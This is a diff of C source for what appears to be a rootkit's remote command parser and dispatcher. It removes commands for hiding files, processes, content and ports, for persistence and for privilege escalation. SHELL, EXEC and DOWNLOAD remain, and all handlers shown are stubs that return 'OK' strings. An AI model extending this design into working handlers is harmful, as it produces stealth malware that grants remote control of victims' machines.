@@ -15,19 +15,7 @@ enum rk_cmd_kind {
 	RK_CMD_SHELL,
 	RK_CMD_EXEC,
 	RK_CMD_DOWNLOAD,
-	RK_CMD_HIDE_FILE,
-	RK_CMD_UNHIDE_FILE,
-	RK_CMD_HIDE_PID,
-	RK_CMD_UNHIDE_PID,
-	RK_CMD_HIDE_CONTENT,
-	RK_CMD_UNHIDE_CONTENT,
-	RK_CMD_HIDE_PORT,
-	RK_CMD_UNHIDE_PORT,
-	RK_CMD_PERSIST,
-	RK_CMD_UNPERSIST,
-	RK_CMD_ESCALATE,
 	RK_CMD_INFO,
-	RK_CMD_LIST,
 	RK_CMD_UNKNOWN,
 };
 
@@ -72,26 +60,13 @@ struct rk_cmd_entry {
 /* Prefixed commands: keyword includes the trailing space before the argument.
  * Bare commands: keyword is the full match (no argument). */
 static const struct rk_cmd_entry cmd_table[] = {
-	/* Two-word prefixed commands (with arguments) */
-	{ "HIDE FILE ",      10, RK_CMD_HIDE_FILE,      true  },
-	{ "UNHIDE FILE ",    12, RK_CMD_UNHIDE_FILE,    true  },
-	{ "HIDE PID ",        9, RK_CMD_HIDE_PID,       true  },
-	{ "UNHIDE PID ",     11, RK_CMD_UNHIDE_PID,     true  },
-	{ "HIDE CONTENT ",   13, RK_CMD_HIDE_CONTENT,   true  },
-	{ "UNHIDE CONTENT ", 15, RK_CMD_UNHIDE_CONTENT, true  },
-	{ "HIDE PORT ",      10, RK_CMD_HIDE_PORT,      true  },
-	{ "UNHIDE PORT ",    12, RK_CMD_UNHIDE_PORT,    true  },
-	/* Single-word prefixed commands (with arguments) */
+	/* Prefixed commands (with arguments) */
 	{ "EXEC ",            5, RK_CMD_EXEC,           true  },
 	{ "DOWNLOAD ",        9, RK_CMD_DOWNLOAD,       true  },
-	{ "LIST ",            5, RK_CMD_LIST,           true  },
 	/* Bare keywords (no arguments) */
 	{ "PING",             4, RK_CMD_PING,           false },
 	{ "STATUS",           6, RK_CMD_STATUS,         false },
 	{ "SHELL",            5, RK_CMD_SHELL,          false },
-	{ "PERSIST",          7, RK_CMD_PERSIST,        false },
-	{ "UNPERSIST",        9, RK_CMD_UNPERSIST,      false },
-	{ "ESCALATE",         8, RK_CMD_ESCALATE,       false },
 	{ "INFO",             4, RK_CMD_INFO,           false },
 };
 
@@ -160,32 +135,8 @@ static int __maybe_unused rk_command_dispatch(struct rk_command *cmd)
 		return rk_send_response("EXEC OK");
 	case RK_CMD_DOWNLOAD:
 		return rk_send_response("DOWNLOAD OK");
-	case RK_CMD_HIDE_FILE:
-		return rk_send_response("HIDE FILE OK");
-	case RK_CMD_UNHIDE_FILE:
-		return rk_send_response("UNHIDE FILE OK");
-	case RK_CMD_HIDE_PID:
-		return rk_send_response("HIDE PID OK");
-	case RK_CMD_UNHIDE_PID:
-		return rk_send_response("UNHIDE PID OK");
-	case RK_CMD_HIDE_CONTENT:
-		return rk_send_response("HIDE CONTENT OK");
-	case RK_CMD_UNHIDE_CONTENT:
-		return rk_send_response("UNHIDE CONTENT OK");
-	case RK_CMD_HIDE_PORT:
-		return rk_send_response("HIDE PORT OK");
-	case RK_CMD_UNHIDE_PORT:
-		return rk_send_response("UNHIDE PORT OK");
-	case RK_CMD_PERSIST:
-		return rk_send_response("PERSIST OK");
-	case RK_CMD_UNPERSIST:
-		return rk_send_response("UNPERSIST OK");
-	case RK_CMD_ESCALATE:
-		return rk_send_response("ESCALATE OK");
 	case RK_CMD_INFO:
 		return rk_send_response("INFO OK");
-	case RK_CMD_LIST:
-		return rk_send_response("LIST OK");
 	case RK_CMD_UNKNOWN:
 		return rk_send_response("ERR unknown command");
 	}
